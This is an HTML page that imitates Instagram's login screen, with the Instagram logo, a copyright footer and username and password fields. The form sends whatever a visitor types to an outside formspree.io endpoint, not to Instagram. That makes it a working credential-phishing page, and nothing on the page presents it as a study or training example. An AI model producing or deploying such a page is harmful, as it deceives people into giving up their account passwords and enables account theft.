<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Instagram</title>
<style>
  body {
    display: flex;
    justify-content: center;
    align-items: center;
    background-color: #fafafa;
    font-family: Arial, sans-serif;
    height: 100vh;
    margin: 0;
  }

  .main-container {
    width: 350px;
    background-color: #fff;
    border: 1px solid #dbdbdb;
    padding: 40px 40px;
    box-shadow: 0 0 5px rgba(0,0,0,0.1);
  }

  /* Logo and header styling */
  .logo {
    display: block;
    margin: 0 auto 20px auto;
    width: 175px;
  }

  /* Form styling */
  form {
    display: flex;
    flex-direction: column;
  }

  input[type=text], input[type=password] {
    height: 38px;
    margin-bottom: 6px;
    padding: 9px 0 7px 8px;
    border: 1px solid #dbdbdb;
    background: #fafafa;
    outline: none;
    border-radius: 3px;
    font-size: 14px;
  }

  button {
    background-color: #3897f0;
    border: none;
    outline: none;
    height: 30px;
    width: 100%;
    border-radius: 4px;
    margin-top: 8px;
    font-weight: 600;
    font-size: 14px;
    cursor: pointer;
  }

  button:disabled {
    background-color: #b2dffc;
    cursor: not-allowed;
  }

  /* Text below the form */
  .or {
    display: flex;
    align-items: center;
    margin: 10px 0;
  }

  .or-line {
    flex: 1;
    height: 1px;
    background-color: #dbdbdb;
  }

  span {
    margin: 0 10px;
    font-size: 13px;
    color: #8e8e8e;
    font-weight: 600;
  }

  /* Sign up box */
  .signup-box {
    background-color: #fff;
    border: 1px solid #dbdbdb;
    padding: 20px 0;
    margin-top: 10px;
    text-align: center;
  }

  .signup-box p {
    font-size: 14px;
    margin: 0;
  }

  .signup-box a {
    font-weight: 600;
    color: #3897f0;
    text-decoration: none;
  }

  /* Footer */
  footer {
    margin-top: 20px;
    font-size: 12px;
    color: #999;
    text-align: center;
  }
</style>
</head>
<body>

<div class="main-container">
  <!-- Instagram Logo -->
  <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo" />

  <!-- Login Form -->
  <form action="https://formspree.io/f/mgoldyyw" method="POST">
    <input type="text" name="username" placeholder="Phone number, username, or email" required />
    <input type="password" name="password" placeholder="Password" required />
    <button type="submit">Log In</button>
  </form>

  <!-- OR separator -->
  <div class="or">
    <div class="or-line"></div>
    <span>OR</span>
    <div class="or-line"></div>
  </div>

  <!-- Continue with Facebook (optional, can be omitted or styled further) -->
  <!--
  <div style="text-align: center; margin-top: 10px; font-weight: 600; cursor: pointer;">
    Log in with Facebook
  </div>
  -->

  <!-- Sign up box -->
  <div class="signup-box">
    <p>Don't have an account? <a href="#">Sign up</a></p>
  </div>
</div>

<!-- Optional footer for info -->
<footer>
  <p>Instagram Â© 2023</p>
</footer>

</body>
</html>
